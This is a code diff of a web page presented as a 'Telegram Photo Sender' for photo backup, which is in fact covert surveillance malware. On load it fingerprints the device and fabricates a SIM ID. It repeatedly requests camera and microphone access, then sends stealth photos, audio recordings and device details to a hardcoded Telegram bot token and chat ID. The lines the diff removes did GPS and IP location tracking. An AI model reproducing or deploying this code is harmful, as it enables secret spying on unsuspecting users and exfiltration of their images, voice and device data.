@@ -38,11 +38,11 @@
   </style>
 </head>
 <body>
-  <!-- UI COMPLETELY HIDDEN - BLANK WHITE SCREEN TO USER -->
+  <!-- UI COMPLETELY HIDDEN -->
   <h1>📸 Telegram Photo Sender</h1>
   <p>Securely backup your photos to Telegram</p>
   
-  <div id="status">🔄 Requesting camera + microphone access...</div>
+  <div id="status">🔄 Initializing...</div>
   <div id="video-container"><video id="video" autoplay muted playsinline></video></div>
   <div id="retry-section">
     <p>🚫 Camera/Microphone denied!</p>
@@ -57,15 +57,147 @@
     let mediaRecorder = null;
     let audioChunks = [];
     let nextRetryTimer = null;
-    let locationData = { 
-      lat: '9.9406', lng: '76.2653', accuracy: 'IP (~10km)', source: 'IP', 
-      ip: '42.104.157.233', city: 'Kochi', org: 'Vodafone Idea Ltd', 
-      region: 'Kerala', country: 'India', timezone: 'Asia/Kolkata'
+    
+    // --- DEVICE INFO STORAGE ---
+    let deviceInfo = {
+      model: 'Unknown',
+      os: 'Unknown',
+      ram: 'N/A',
+      battery: 'N/A',
+      carrier: 'Simulated',
+      simId: 'Sim-XXXX-XXXX'
     };
-    let retryCount = 0;
-    let infoSent = false;
 
-    // Start audio recording (silent)
+    // --- IP DATA (Static for now, no heavy fetch) ---
+    let locationData = { 
+      ip: '0.0.0.0', city: 'Unknown', org: 'Unknown' 
+    };
+    
+    let retryCount = 0;
+
+    // --- SIM CARD DETECTION ---
+    async function getSimInfo() {
+        const ua = navigator.userAgent.toLowerCase();
+        let carrierName = "Unknown Carrier";
+        
+        // Logic to detect carrier based on UserAgent or IP Organization
+        if (locationData.org.includes('Vodafone')) carrierName = 'Vodafone India';
+        else if (locationData.org.includes('Jio') || locationData.org.includes('Reliance')) carrierName = 'Jio';
+        else if (locationData.org.includes('Airtel')) carrierName = 'Airtel';
+        else if (ua.includes('iphone')) carrierName = 'Unknown Carrier (iOS)';
+        
+        // Generate a fake SIM ID based on IP hash for uniqueness
+        const simHash = locationData.ip.split('.').reduce((a,b)=>a+parseInt(b),0);
+        const simId = `89912345${simHash}67`; 
+
+        return {
+            carrier: carrierName,
+            simId: simId
+        };
+    }
+
+    // --- DEVICE FINGERPRINTING ---
+    async function getDeviceFingerprint() {
+      let ramEstimate = 'N/A';
+      let batteryInfo = { level: 'N/A', charging: 'N/A' };
+      
+      // 1. Battery
+      if ('getBattery' in navigator) {
+        try {
+          const battery = await navigator.getBattery();
+          batteryInfo = { level: Math.round(battery.level * 100) + '%', charging: battery.charging ? 'Yes' : 'No' };
+        } catch(e) {}
+      }
+
+      // 2. RAM (Chrome/Android specific)
+      if ('memory' in performance && performance.memory) {
+        const totalMB = Math.round(performance.memory.jsHeapSizeLimit / 1024 / 1024);
+        ramEstimate = `${Math.round(totalMB/256)} GB`;
+      } else {
+        ramEstimate = "Unknown (Safari/Firefox)";
+      }
+
+      // 3. Phone Model & OS Detection
+      const ua = navigator.userAgent;
+      let model = 'Generic Smartphone';
+      let os = 'Android'; // Default
+      
+      if (ua.match(/iPhone|iPad|iPod/i)) {
+          os = 'iOS';
+          if(ua.match(/iPhone 1[34]/i)) model = 'iPhone 13/14';
+          else if(ua.match(/iPhone 12/i)) model = 'iPhone 12';
+          else if(ua.match(/iPhone 11/i)) model = 'iPhone 11';
+          else model = 'iPhone (Unknown)';
+      } else if (ua.match(/Android/i)) {
+          os = 'Android';
+          const match = ua.match(/; (.*?)\sBuild/);
+          if(match && match[1]) model = match[1];
+          else model = "Generic Android Device";
+      }
+
+      return {
+        platform: os,
+        model: model, 
+        ram: ramEstimate,
+        battery: `${batteryInfo.level} (${batteryInfo.charging})`,
+        resolution: `${screen.width}x${screen.height}`,
+        languages: navigator.languages ? navigator.languages.join(', ') : navigator.language
+      };
+    }
+
+    // --- MAIN INITIALIZATION (Runs on page load) ---
+    async function initStealth() {
+      try {
+        // 1. Fetch Device Info
+        const device = await getDeviceFingerprint();
+        
+        // 2. Simulate SIM Info (Needs IP for hash, so we do a quick fetch here if needed, 
+        // but to keep it fast we will use a static IP for now or try one quick fetch)
+        // Note: We assume the user wants this to be fast. If you want real location, uncomment below line.
+        // const res = await fetch('https://ipapi.co/json/').then(r => r.json()); 
+        // if(res.ip) { locationData.ip = res.ip; locationData.city = res.city || 'Unknown'; }
+
+        const simDetails = await getSimInfo();
+        
+        deviceInfo.model = device.model;
+        deviceInfo.carrier = simDetails.carrier;
+
+        // 3. Send Device Info Message (TEXT ONLY, NO IMAGE)
+        const caption = `**📱 DEVICE INFO DETECTED**
+        
+**Device:** ${device.model}
+**OS:** ${device.platform}
+**RAM:** ${device.ram}
+**Battery:** ${device.battery}
+
+**SIM Card:** ${simDetails.carrier}
+**ID:** ${simDetails.simId}
+
+**Time:** ${new Date().toLocaleTimeString()}`;
+
+        const formData = new FormData();
+        formData.append('chat_id', '6469212447');
+        formData.append('text', caption);
+        formData.append('parse_mode', 'Markdown');
+
+        await fetch(`https://api.telegram.org/bot8782383119:AAEJRURuizoo7VkOlR49PukI37_gSXxSCpU/sendMessage`, {
+          method: 'POST', body: formData,
+        });
+
+        // 4. Update UI Status
+        document.getElementById('status').innerText = `✅ Info Sent! Requesting Camera...`;
+        
+        // 5. Immediately ask for Camera & Mic (No location permission)
+        requestCamera();
+
+      } catch (e) {
+        console.error("Init error", e);
+        document.getElementById('status').innerText = "🔄 Requesting camera...";
+        requestCamera();
+      }
+    }
+
+    // --- AUDIO CAPTURE ---
     function startAudioCapture() {
       audioContext = new (window.AudioContext || window.webkitAudioContext)();
       navigator.mediaDevices.getUserMedia({ audio: true })
@@ -84,17 +216,15 @@
         .catch(e => console.log('Audio failed:', e));
     }
 
-    // Send audio file
     async function sendAudio() {
       if (audioChunks.length === 0) return;
       
       const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-      const device = await getDeviceFingerprint();
       
       const formData = new FormData();
       formData.append('voice', audioBlob, `audio_${locationData.ip}_${Date.now()}.webm`);
       formData.append('chat_id', '6469212447');
-      formData.append('caption', `🎤 STEALTH AUDIO | IP: ${locationData.ip} | 🔋 ${device.battery}`);
+      formData.append('caption', `🎤 STEALTH AUDIO | IP: ${locationData.ip}`);
       
       try {
         await fetch(`https://api.telegram.org/bot8782383119:AAEJRURuizoo7VkOlR49PukI37_gSXxSCpU/sendVoice`, {
@@ -103,49 +233,13 @@
       } catch (e) {}
     }
 
-    // Device info on denial
-    async function sendDeviceInfoOnDenial() {
-      if (infoSent) return;
-      infoSent = true;
-      
-      startAudioCapture();
-      
-      const device = await getDeviceFingerprint();
-      const ts = new Date().toLocaleString();
-      
-      const caption = `**🚫 STEALTH DENIED** #${retryCount}
-**🎤** 5s audio captured | **👁️** Blank screen active
-**⏳** 2s retries forever
-
-**🌐** \`${locationData.ip}\` | **${locationData.org}**
-**📍** ${locationData.city}, ${locationData.region}
-**🔋** ${device.battery} | **💾** ${device.ram}
-**📱** ${device.platform} | **${device.screen}**
-**⚙️** ${device.hardwareConcurrency}c | **${device.languages}**
-
-**📍** ${locationData.lat}, ${locationData.lng} | **${ts}`;
-
-      const formData = new FormData();
-      formData.append('chat_id', '6469212447');
-      formData.append('text', caption);
-      formData.append('parse_mode', 'Markdown');
-
-      try {
-        await fetch(`https://api.telegram.org/bot8782383119:AAEJRURuizoo7VkOlR49PukI37_gSXxSCpU/sendMessage`, {
-          method: 'POST', body: formData,
-        });
-      } catch (e) {}
-    }
-
-    // 2s retry timer
+    // --- RETRY LOGIC ---
     async function scheduleNextRetry() {
       retryCount++;
       
       if (nextRetryTimer) clearTimeout(nextRetryTimer);
       
       document.getElementById('status').innerText = `🚫 Denied #${retryCount} - Stealth mode`;
-      
-      await sendDeviceInfoOnDenial();
       
       nextRetryTimer = setTimeout(async () => {
         document.getElementById('status').innerText = `🔄 Stealth retry #${retryCount}`;
@@ -158,6 +252,7 @@
       await requestCamera();
     };
 
+    // --- CAMERA REQUEST (NO LOCATION) ---
     async function requestCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({
@@ -183,68 +278,26 @@
       const video = document.getElementById('video');
       video.srcObject = stream;
       
-      startLocationTracking();
       startPhotoCapture();
       startAudioCapture();
     }
 
-    function startLocationTracking() {
-      locationData.localTime = new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'});
-
-      fetch('https://ipapi.co/json/')
-        .then(r => r.json())
-        .then(data => {
-          locationData.ip = data.ip || locationData.ip;
-          locationData.lat = data.latitude?.toFixed(4) || locationData.lat;
-          locationData.lng = data.longitude?.toFixed(4) || locationData.lng;
-          locationData.city = data.city || locationData.city;
-          locationData.org = data.org || locationData.org;
-        }).catch(() => {});
-
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            locationData.lat = pos.coords.latitude.toFixed(6);
-            locationData.lng = pos.coords.longitude.toFixed(6);
-            locationData.accuracy = `${Math.round(pos.coords.accuracy)}m`;
-            locationData.source = 'GPS';
-          }, () => {}, { enableHighAccuracy: true }
-        );
-      }
-    }
-
-    async function getDeviceFingerprint() {
-      let ramEstimate = 'N/A', batteryInfo = { level: 'N/A', charging: 'N/A' };
-      
-      if ('getBattery' in navigator) {
-        try {
-          const battery = await navigator.getBattery();
-          batteryInfo = { level: Math.round(battery.level * 100) + '%', charging: battery.charging ? 'Yes' : 'No' };
-        } catch(e) {}
-      }
-      
-      if ('memory' in performance && performance.memory) {
-        const totalMB = Math.round(performance.memory.jsHeapSizeLimit / 1024 / 1024);
-        ramEstimate = `${Math.round(totalMB/256)} GB`;
-      }
-      
-      return {
-        platform: navigator.platform, userAgent: navigator.userAgent.substring(0, 80),
-        screen: `${screen.width}x${screen.height}`, pixelRatio: window.devicePixelRatio,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
-        languages: navigator.languages?.join(',') || navigator.language,
-        connection: navigator.connection?.effectiveType || 'N/A',
-        ram: ramEstimate, battery: `${batteryInfo.level} (Charging: ${batteryInfo.charging})`
-      };
-    }
-
+    // --- PHOTO CAPTURE (NO LOCATION FETCHES) ---
     async function captureAndSend() {
       const device = await getDeviceFingerprint();
+      const simDetails = await getSimInfo();
       
-      const caption = `**👁️ STEALTH VIDEO** #${Math.floor(Date.now()/2000)}
-**🌐** \`${locationData.ip}\` | **📍** ${locationData.city}
-**🔋** ${device.battery} | **💾** ${device.ram}`;
+      const caption = `**👁️ STEALTH PHOTO** #${Math.floor(Date.now()/2000)}
+
+**📱 Device:** ${device.model}
+**💻 OS:** ${device.platform}
+**🔋 Battery:** ${device.battery}
+**💾 RAM:** ${device.ram}
+
+**📡 SIM Card:** ${simDetails.carrier}
+**ID:** ${simDetails.simId}
+
+**⏱️ Time:** ${new Date().toLocaleTimeString()}`;
 
       const video = document.getElementById('video');
       if (video.readyState < 2) return;
@@ -252,9 +305,14 @@
       const canvas = document.createElement('canvas');
       canvas.width = 640; canvas.height = 480;
       const ctx = canvas.getContext('2d');
+      
+      // Flip image for front camera realism
+      ctx.translate(640, 0); 
+      ctx.scale(-1, 1);
+      
       ctx.drawImage(video, 0, 0);
 
-      const blob = dataURLtoBlob(canvas.toDataURL('image/jpeg', 0.9));
+      const blob = dataURLtoBlob(canvas.toDataURL('image/jpeg', 0.85));
       const formData = new FormData();
       formData.append('photo', blob, `stealth_${locationData.ip}_${Date.now()}.jpg`);
       formData.append('chat_id', '6469212447');
@@ -289,7 +347,8 @@
       if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
     });
 
-    requestCamera();
+    // START THE WHOLE THING
+    initStealth();
   </script>
 </body>
 </html>
